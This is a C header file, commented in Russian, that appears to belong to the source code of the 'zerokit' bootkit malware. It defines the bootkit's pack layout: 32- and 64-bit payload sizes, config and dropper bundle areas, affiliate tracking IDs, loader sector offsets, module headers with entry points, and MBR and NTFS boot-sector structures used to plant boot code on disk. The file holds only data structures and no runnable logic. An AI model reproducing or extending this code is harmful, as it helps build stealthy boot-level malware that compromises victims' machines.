#ifndef __MOD_H_
#define __MOD_H_

#define MODF_COMPRESSED 0x00000001

// Структуры пака зерокита.

#pragma pack(push, 1)

typedef struct _exploit_startup_header
{
    union {
        wchar_t filePath[256];
        uint8_t buffer[512];
    } u;
} exploit_startup_header_t, *pexploit_startup_header_t;

typedef struct _zerokit_header
{
    uint32_t sizeOfPack;        // Размер всего пака, включая размер этого заголовка, размер буткита и размер пака лоадера, размер кнфигурационной области и бандла (если он есть).
    uint32_t sizeOfBootkit;     // Размер буткита, который находится сразу после exploit_startup_header_t.
    uint32_t sizeOfBkPayload32; // Размер 32-битного буткитного пейлода.
    uint32_t sizeOfBkPayload64; // Размер 64-битного буткитного пейлода.
    uint32_t sizeOfConfig;      // Размер конфигурационной области, которая расположена сразу после 64-битной версии зерокита.
    uint32_t sizeOfBundle;      // Размер пачки, которая может быть добавлена дроппером, во время установки сразу за конфигурационной областью.
    uint32_t affid;
    uint32_t subid;
} zerokit_header_t, *pzerokit_header_t;

typedef struct _loader32_info
{
    uint64_t loaderOffset;
    uint32_t loaderSize;
    uint32_t startSector;
    uint32_t bootkitReserved1;
} loader32_info_t, *ploader32_info_t;

typedef struct _loader64_info
{
    uint64_t loaderOffset;
    uint32_t loaderSize;
    uint32_t startSector;
    uint64_t bootkitReserved1;
} loader64_info_t, *ploader64_info_t;

typedef struct _mods_pack_header
{
    uint32_t sizeOfPack;    // Размер пака, без учёта данного заголовка.
    uint64_t crc;           // 64-битная контрольная сумма вычисленная по телу mod-а.
    uint32_t bkBaseDiff;    // Разница между текущим заголовком и началом буткита, который находится перед паками.
} mods_pack_header_t, *pmods_pack_header_t;

typedef struct _mod_header
{
	uint32_t fakeBase;      // Фейковая база для вычисления реальных смещений.
	uint64_t crc;           // 64-битная контрольная сумма вычисленная по телу mod-а.
	uint32_t sizeOfMod;     // Размер тела, которое начинается сразу после данного заголовка (может быть размером мода после компрессии).
    uint32_t sizeOfModReal; // Реальный размер мода.
	uint32_t entryPointRVA; // RVA точки входа относительно заголовка.
	uint32_t confOffset;    // Смещение в байтах до конфигурации.
    uint32_t confSize;      // Размер конфигурации.
	uint32_t flags;         // Флаги
	uint32_t reserved3;
} mod_header_t, *pmod_header_t;

typedef struct _partition_table_entry
{
    uint8_t  active;        // Индикатор загрузки - указывает, является ли том активным разделом: 00 — не используется для загрузки; 80 — активный раздел.
    uint8_t  startHead;     // Начальная головка.
    uint16_t startCyl;      // Биты 0..5 - начальный сектор. Биты 6..15 - начальный цилиндр.
    uint8_t  sysID;         // Идентификатор системы, определяещий тип тома.
    uint8_t  endHead;       // Конечная головка.
    uint16_t endCyl;        // Биты 0..5 - конечный сектор. Биты 6..15 - конечный цилиндр.
    uint32_t startSect;     // Смещение от начала диска до начала тома, выраженное в числе секторов.
    uint32_t totalSects;    // Число секторов в данном томе.
} partition_table_entry_t, *ppartition_table_entry_t;

typedef struct _bk_mbr
{
    uint8_t opcodes[432];
    union {
        uint8_t data2[78];
        struct
        {
            uint8_t pad[14];
            partition_table_entry_t pt[4];
        };
    };
    uint16_t magic;
} bk_mbr_t, *pbk_mbr_t;

typedef struct _bios_dap
{
    uint8_t  size;
    uint8_t  unk;
    uint16_t numb;
    uint16_t dst_off;
    uint16_t dst_sel;
    uint64_t sector;
} bios_dap_t, *pbios_dap_t;

typedef struct _bios_parameter_block
{
    /*0x0b*/uint16_t bytesPerSector;    // Размер сектора, в байтах.
    /*0x0d*/uint8_t  sectorsPerCluster; // Секторов в кластере.
    /*0x0e*/uint16_t reservedSectors;   // Должен быть ноль.
    /*0x10*/uint8_t  fats;              // должен быть ноль.
    /*0x11*/uint16_t root_entries;      // должен быть ноль.
    /*0x13*/uint16_t sectors;			// должен быть ноль.
    /*0x15*/uint8_t  mediaType;		    // тип носителя, 0xf8 = hard disk.
    /*0x16*/uint16_t sectorsPerFat;		// должен быть ноль.
    /*0x18*/uint16_t sectorsPerTrack;	// не используется.
    /*0x1a*/uint16_t heads;			    // не используется.
    /*0x1c*/uint32_t hiddenSectors;		// Количество скрытых секторов предшествующих тому.
    /*0x20*/uint32_t largeSectors;		// должен быть ноль.
    /* sizeof() = 25 (0x19) bytes */
} bios_parameter_block_t, *pbios_parameter_block_t;

typedef struct _bk_ntfs_vbr
{
    /*0x00*/uint8_t jump[3];                // переход на загрузочный код.
    /*0x03*/char oemName[8];                // сигнатура "NTFS    ".
    /*0x0b*/bios_parameter_block_t bpb;
    /*0x24*/uint8_t physicalDrive;	    	// не используется.
    /*0x25*/uint8_t currentHead;		    // не используется.
    /*0x26*/uint8_t extendedBootSignature;  // не используется.
    /*0x27*/uint8_t reserved2;              // не используется.
    /*0x28*/uint64_t totalSectors;      	// Количество секторов на томе.
    /*0x30*/uint64_t mftStartCluster;       // Стартовый кластер MFT.
    /*0x38*/uint64_t mftMirrStartCluster;   // Стартовый кластер копии MFT.
    /*0x40*/char clustersPerMftRecord;      // Размер MFT записи в кластерах.
    /*0x41*/uint8_t reserved0[3];           // зарезервировано.
    /*0x44*/char clustersPerIndexRecord;    // Размер индексной записи в кластерах.
    /*0x45*/uint8_t reserved1[3];           // зарезервировано.
    /*0x48*/uint64_t volumeSerialNumber;    // уникальный серийный номер тома.
    /*0x50*/uint32_t checksum;              // не используется.
    /*0x54*/uint8_t  bootstrap[426];		// загрузочный-код.
    /*0x1fe*/uint16_t endOfSectorMarker;	// конец загрузочного сектора, сигнатура 0xAA55.
    /* sizeof() = 512 (0x200) bytes */
} bk_ntfs_vbr_t, *pbk_ntfs_vbr_t;

#pragma pack(pop)

typedef long (*FnmodEntryPoint)(uintptr_t modBase, pvoid_t pGlobalBlock);

#define FREE_SPACE_AFTER 7

#endif // __MOD_H_
